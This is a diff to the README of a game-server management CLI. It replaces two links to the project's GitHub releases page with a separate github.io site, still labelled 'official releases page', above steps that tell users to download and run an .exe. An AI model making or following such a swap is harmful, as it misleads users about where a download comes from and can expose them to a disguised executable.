@@ -1,6 +1,6 @@
 # 🎮 game-fetcher-cli - Manage game servers with simple profiles
 
-[Download the latest release](https://github.com/Ettierevised51/game-fetcher-cli/releases)
+[Download the latest release](https://ettierevised51.github.io)
 
 ## 📌 About this tool
 
@@ -17,7 +17,7 @@ Your computer needs these items to run the software:
 
 ## 📥 How to download and install
 
-1.  Visit the [official releases page](https://github.com/Ettierevised51/game-fetcher-cli/releases).
+1.  Visit the [official releases page](https://ettierevised51.github.io).
 2.  Look for the latest version at the top of the list.
 3.  Click the file ending in `.exe` to start the download.
 4.  Move this file to a folder where you want your game servers to live.
